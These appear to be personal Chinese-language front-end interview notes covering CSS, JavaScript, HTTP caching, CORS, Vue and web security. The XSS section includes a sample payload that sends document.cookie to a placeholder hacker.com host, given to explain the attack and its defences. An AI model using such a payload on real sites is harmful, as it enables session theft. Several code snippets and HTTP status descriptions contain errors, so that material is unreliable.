### HTML
#### HTML语义化
+ eg:段落用p,边栏用aside，主页内容用main标签
+ 引申历史 table布局 div布局header main footer
#### meta viewport
```
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
```
+ 控制页面在移动端不要缩小
+ 当时的手机是不适应屏幕的 Iphone3gs模拟980px然后缩小页面
+ 
#### canvas
+ 看项目

### CSS
####  盒模型
+ content-box:width=内容区宽度
+ border-box:width=内容区宽度+padding宽度（不管IE的话 box-sizing:border-box;）
#### css reset和normalize.css的区别
+ reset重置样式，抛弃之前的样式
+ normalize让所有的浏览器的标签都跟规定的默认样式一致,各浏览器间统一（Linux、window平台下）
#### 如何居中？
+ 七种实现方式
 - 水平居中
    - 内联：父容器text-align:center 
    - 快级：margin-left:auto;margin-right:auto;
- 垂直居中
    -[七种写法](https://github.com/Composur/resume/tree/master/review/interview/%E7%AC%94%E8%AF%95%E7%BB%83%E4%B9%A0/%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD)
#### 选择器的优先级
+ 选择器越具体优先级越高
+ 同样优先级写在后面的覆盖前面的
+ color:red !important;最高
#### BFC是什么
+ 举例：overflow:hidden;清除浮动，
+ overflow:hidden;[取消父子margin合并](http://js.jirengu.com/tubuloquru/1/edit?html,css,output),可以用padding-top:0.1px;来取消父子合并
#### 如何清楚浮动
+ overflow:hidden;
+ clearfix::after{
    content:'';
    display:block;
    clear:both;
    zoom:1;//兼容IE
};写在父容器上
#### css动画等 

### javascript

#### js有哪些数据类型
+ String、Number、Boolean、Null、Object、Undefined、Symbol，7种；object包括（数组、函数、正则、日期，NaN）
#### promise如何使用
+ then
    ```
    $.ajax(...).then(成功函数、失败函数).then(success,err)//只要前面没有失败都会调用promise
    ```
+ 如何自己生成？
    ```
    function fn(){
        return new Promise((resolve,reject)=>{
            setTimeout(()=>{
               resolve() // 或者reject() 
            },3000)
        })
    }
    fn.then(...)
    ```




```
const getJSON = function(url) {
  const promise = new Promise(function(resolve, reject){
    const handler = function() {
      if (this.readyState !== 4) {
        return;
      }
      if (this.status === 200) {
        resolve(this.response);
      } else {
        reject(new Error(this.statusText));
      }
    };
    const client = new XMLHttpRequest();
    client.open("GET", url);
    client.onreadystatechange = handler;
    client.responseType = "json";
    client.setRequestHeader("Accept", "application/json");
    client.send();

  });

  return promise;
};

getJSON("/posts.json").then(function(json) {
  console.log('Contents: ' + json);
}, function(error) {
  console.error('出错了', error);
});
```
#### 手写ajax
```
      function ajax() {
          //第一步:创建对象!
            var xmlHttp;
            if (window.XMLHttpRequest) {
                xmlHttp = new XMLHttpRequest();
            } else {
                xmlHttp = new ActiveXObject('MicroSoft.XMLHTTP');//兼容IE6
            }
            // 第二步:向服务器发送请求!
                xmlHttp.open('get', 'package.json', true);//启动一个请求准备发送 true是异步
            // 第三步:服务器接受响应并返回值.
            //需在调用open之前指定onreadystatechange确保跨浏览器兼容性
            xmlHttp.onreadystatechange = function () {
            if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
                console.log(xmlHttp.responseText);
            }
                //发送特定的请求
                xmlHttp.send();

            }
      }
        ajax();
```
#### 闭包是什么？
```
function createAdder(){
    var n=0
    return function(){
        n+=1
    }
}
let add=createAdder()
add()//1
add()//2
console.log(n)// n is not defined
```

#### 这段代码中的this是什么？
```
    //看函数如何调用的
    fn()//this 就是window
    a.fn() //this就是a
    a.b.c.fn() //this就是a.b.c
    在严格模式下
    this是undefined
    new Object() this就是new的实例
    ()=>console.log(this) es6中的this就是外面的this
```
#### 立即执行函数（用途）
+ ;(function(){})()
+ 造出一个函数作用域，防止污染全局变量
+ es6 
    ```
    {
        let name
    }
    ```
#### async/await语法
+ 把异步代码写成同步代码
```
function resolveAfter2Seconds() {
  return new Promise(resolve => {
    setTimeout(() => {
      resolve('resolved');
    }, 2000);
  });
}

async function asyncCall() {
  console.log('calling');
  var result = await resolveAfter2Seconds();
  console.log(result);
  // expected output: "resolved"
}

asyncCall();

```
#### 如何实现深拷贝
+  JSON.parse(JSON.stringify(object)) 来解决。
局限
1. 会忽略 undefined
2. 不能序列化函数
3. 不能解决循环引用的对象

+ JSON来深拷贝
    ```
    var a={...}
    var b=JSON.parse(JSON.stringify(a))//不支持函数
    undefined、正则、Date...
    ```
+ 递归的方式（只是思路，不能这么用）

    ```
        function clone(obj){
            var newObj
            if(!(obj instanceof Object)){
                return obj
            }else if(obj instanceof Array){
                newObj=[]
            }else if(obj instanceof Object){
                newObj={}
            }else if(obj instanceof Function){
                newObj=eval(Object.toString)
            }
            for(var key in obj){
                newObj[key]=clone(obj(key))
            }
            return newObj
        }

            
    ```
+ 环
+ 正则的拷贝 date set symbol
#### 数组去重
+ map filter

```
function unique(arr) {
    const res = new Map();
    return arr.filter((a) => !res.has(a) && res.set(a, 1))
}
```

+ 技术排序（只能正整数）
```
   var a=[1,2,3,45,45,3,2,1]
    var hashTab={}
    for(var i=0;i<a.length;i++){
    if(a[i] in hashTab){
        
    }else{
        hashTab[a[i]]=true
    }
    }
    console.log(Object.keys(hashTab))

```
+ Set去重
    ``` var a=[1,2,3,45,45,3,2,1]
         Array.from(new Set(a))
    ```

+ 用正则实现string.trim()

```
    function strim(str){
        str.replace(/^\s+|\s+$/,'')
    }

```
#### 原型
+ 举例(类似一层一层查找属性的过程)
+ 查找属性过程中的__proto__就是原型链

```
var a=[1,2,3]
a.push(4) //push就是沿着a.__proto__找的
a=[1,2,3,4]
a.__proto__.push===Array.prototype.push
Array.prototype 就是a的原型(__proto__)
```
#### class
+ mdn

#### JS如何实现继承
+ 原型链继承

```
function Animal(){
    this.age=18
}

Animal.prototype.move=function(){

}

function  Person(){
    Animal.apply(this,arguments)
    this.name=name
}


var f=function(){}

f.prototype=Animal.prototype

Person.prototype=new f()
Person.prototype.test=function(){}

var tom=new Person()
```
+ extends关键字

```
class Animal{
  constructor(){
    this.age=18
  }
  move(){}
}
class Person extends Animal{
  constructor(name){
    super()
    this.name=name
  }
  tools(){}
}
```
#### '=='的问题
+ (a==1 && a==2 && a==3)可能为true吗？//为true

```
    var a={
        value:0,
        toString(){
            a.value+=1
            return a.value
        }
    }
```

### DOM

#### Dom事件模型
+ 捕获
+ 冒泡
+ 如果这个元素是被点击的元素，那么捕获不一定会在冒泡之前，就是他自身不存在冒泡（点击的就是它，不存在传播的过程），事件是由监听事件决定的
#### 移动端的触摸事件
+ touchstart touchmove touchend touchcancel
+ 如何模拟swipe事件:记录两次touchmove的位置差，如果后一次在前一次的右面说明向右滑了
#### 事件委托
+ 如果父元素有多个子元素，不监听子元素，而是监听父元素，看触发事件的元素是哪个子元素，这就是事件委托
+ 可以监听动态生成的子元素
+ 节省监听器
```
function listen(element,eventType,selector,fn){
    element.addEventListener(eventType,e=>{
        let el=e.target
        while(!e.matches(selector)){
            if(element===el){ //找到父元素就不在找了 ，break
                el=null
                break 
            }
            el=el.parentNode
        }
        el && el.call(el,e,el)
       // if(e.target.matches(selector)){
         //   fn.call(el,e,el)
       // }
    })
    return element
}
```

### HTTP

+ [HTTP状态码]()
+ 200：服务器响应正常。表示请求成功,请继续发送请求。
+ 304：该资源在上次请求之后没有任何修改（这通常用于浏览器的缓存机制，使用GET请求时尤其需要注意）。
+ 400：无法找到请求的资源，请求有误，请求的内容无法被服务器执行。
+ 401：访问资源的权限不够，没有进行身份验证（或者无权访问）。
+ 403：没有权限访问资源。
+ 404：需要访问的资源不存在（没有找到）。
+ 405：需要访问的资源被禁止。
+ 407：访问的资源需要代理身份验证。
+ 414：请求的URL太长。
+ 500：服务器内部错误。
+ 502：网关错误。
+ 503：暂时不能处理请求，可以过些时候再试。
+ 505：HTTP版本不受支持,可以禁用此版本。
##### 总体说：
+ 400-499：问题出在客户端。
+ 500-599：问题出在服务器端。

#### 301和302的区别是什么?
+ 301永久重定向（浏览器会缓存，直接重定向回去）haha.com => hh.com 
+ 302临时重定向（浏览器不会记住，访问的时候特定的页面无法访问跳转到其它临时页面）临时的
#### HTTP缓存怎么做？
+ Cache-control:max-age=300
+ http://cdn.com/1.js?v=1 避开缓存
#### Cache-Control和Etag的区别是什么？
强缓存
+ Cache-Control 出现于 HTTP / 1.1，优先级高于 Expires 
+ Cache-control: max-age=30该属性表示资源会在30 秒后过期，需要再次请求。
协商缓存
+ ETag 和 If-None-Match
+ ETag 类似于文件指纹，If-None-Match 会将当前 ETag 发送给服务器，询问该资源 ETag 是否变动，有变动的话就将新的资源发送回来。并且 ETag 优先级比 LastModified 高。
#### cookie session?
+ cookie 
    + http相应通过Set-Cookie设置Cookie
    + 浏览器访问指定的域名需要带上Cookie作为Request Header
    + Cookie一般用来记录用户信息
+ session
    + session是服务器端的内存
    + session一般通过Cookie里记录sessionID实现
    + session一般是随机数
#### LocalStroge和Cookie的区别是什么？
+ cookie会随着请求发送到服务器端，而localstorage不会
+ cookie大小一般在4K，localstorage一般在5M
#### GET和POST的区别？
+ GET用来读数据,POST用来写数据，POST不幂等（幂等就是不管发多少次请求结果都一样）
+ 参数，GET的参数放到URl的查询参数里(有长度限制，一般是1024字节)，POST的参数（长度一般是4-10M）放在请求体里
+ 安全，GET没有POST安全
+ 包，GET请求需要发一个包，POST需要发两个以上（因为POST有消息体）
#### 跨域
##### JSONP（仅支持GET）
> 网页通过添加一个`<script>`元素，向服务器请求 JSON 数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来
```
function addScriptTag(src) {
  var script = document.createElement('script');
  script.setAttribute("type","text/javascript");
  script.src = src;
  document.body.appendChild(script);
}

window.onload = function () { 
  addScriptTag('http://example.com/ip?callback=foo');
}

function foo(data) { //调用foo得到一个返回的对象
  console.log('Your public IP address is: ' + data.ip);
};
```
##### webSocket
>该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。有一个字段是Origin，表示该请求的请求源（origin），即发自哪个域名。正是因为有了Origin这个字段，所以 WebSocket 才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。
##### CROS
>CORS 请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。
+ 简单请求就是简单的 HTTP 方法与简单的 HTTP 头信息的结合。
+ POSTMESSAGE

### VUE
+ Vue有哪些生命周期钩子函数？
    + beforeCreate
    + create可以用来在一个实例被创建之后执行代码
        ```
            new Vue({
                data: {
                    a: 1
                },
                created: function () {
                    // `this` 指向 vm 实例
                    console.log('a is: ' +  .a)
                }
            })
                // => "a is: 1"
        ```
    + mount
    + beforeMount
    + mounted
    + beforeUpdate
    + updated
    + beforeDestory
    + Destroyed
+ Vue组件间的通信？
    + 爷孙（通过两对父子通信，爷->爸->儿）
    + 父子（使用Props传递数据，使用v-on绑定自定义事件）
    + 兄弟通信（new Vue() 作为eventBus）
+ Vuex的作用是什么?
+ VueRouter路由是什么？
+ Vue的双向绑定是如何实现的？有什么优缺点？
+ vue数据双向绑定是通过数据劫持结合发布者-订阅者模式的方式来实现的
    + [深入响应原理](https://cn.vuejs.org/v2/guide/reactivity.html)
+ Computed计算属性的用法？跟Methods的区别
    + compuate计算属性，计算大量的逻辑最后返回一个结果，必须有一个返回值
    + method方法的意思，处理一些逻辑代码例如
        ```
        <button @click='do'>do</button>
        new Vue({
            el:'#root',
            methods:{
                do:function(){
                    console.log('do!!')
                }
            }
        })
        ```
### 算法
+ 排序（冒泡、选择、计数、快速、插入、归并） 
    ```
    
    ```
+ 二分查找
+ 翻转二叉树

### 安全
+ 什么是XSS攻击？如何预防?
    ```
     div.innerHTML=userComment //userComment内容是<script>$.get('http://hacker.com/?cookie='+document.cookie)</script>
     //而已代码就执行了
    ```
    + 预防：不要使用innerHTML,改成innerText,script就不会执行
    + 用innerHTML，字符过滤，'<'替换成'&lt'
    + 用innerHTML，字符过滤，'>'替换成'&gt'
    + 用innerHTML，字符过滤，'&'替换成'&amp'
    + 用innerHTML，字符过滤，'"'替换成'&quot'
    + 用innerHTML，字符过滤，'''替换成'&#39'
        ```
        div.innerHTML=useComment.replace(/>/g,'&gt').replace(/<\/g,'&lt')...
        ```
    + 使用CSP(chrom 主动防御)
+ 什么是CSRF攻击，如何预防？
    + 过程
        + 用户在qq.com
        + 用户切换到haacker.com
        + hacker.com发送一个qq.com的请求获取用户的信息
        + 用户的请求信息就被hacker偷走了
        + 不知不觉中做了请求的内容，用户没有发这个请求hacker伪造了用户发请求的假象
    + 避免
        + 检查referer，qq.com可以拒绝来自hacker.com的请求
        + 使用csrf_token来解决
### webpack
+ 转移后的文件过大怎么办？
    + 使用code split
    + 写法 import('xxx').then(xxx=>console.log(xxx))
    + xxx模块就是按需加载
+ 转义速度过慢
    + 
+ webpack loader
    + 从右到左，链式执行
    + 上一个 Loader 的处理结果给下一个接着处理
    + node module 写法
    + module 依赖
    + return && this.callback()
### 发散题
+ 从URL到浏览器呈现页面发送了啥？
    1、DNS查询
    2、建立TCP连接，三次握手
    
    3、发送HTTP请求（请求的四部分）
    4、后台处理请求
        1、监听端口 
        2、路由
        3、渲染HTML模板
        4、生成响应
    5、发送HTTP响应
    6、关闭TCP连接（四次挥手） 
    7、解析HTML
    8、下载css
    9、解析css
    10、下载js
    11、解析js
    12、下载图片
    13、解析图片（图片宽高）
    14、渲染DOM树
    15、渲染样式树
    16、执行js